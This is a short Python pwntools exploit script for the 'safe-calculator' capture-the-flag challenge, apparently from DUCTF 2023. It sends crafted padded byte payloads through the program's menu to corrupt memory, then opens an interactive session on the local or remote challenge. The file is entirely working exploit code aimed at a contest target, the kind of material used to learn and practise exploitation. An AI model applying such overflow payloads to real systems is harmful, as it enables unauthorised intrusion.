#!/usr/bin/python3

from pwn import *

exe = ELF('safe-calculator', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''

                b*calculate+66
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('2023.ductf.dev', 30015)
else:
        p = process(exe.path)

GDB()
part1 = p8(0x37) + p8(0x5F) + p8(0x46) + p8(0x5c)
part2 = p8(0x46) + p8(0x5d)
sla(b'> ', b'2')
sla(b' : ', b'a'*8*4 + b'a'*4 + part1 + b'a'*6 + part2) 
sla(b'> ', b'1')

sla(b'> ', b'2')
sla(b' : ', b'a'*8*4 + b'a'*4 + part1 + b'a'*5) 
sla(b'> ', b'1')

sla(b'> ', b'2')
sla(b' : ', b'a'*8*4 + b'a'*4 + part1 + b'a'*4) 
sla(b'> ', b'1')
p.interactive()
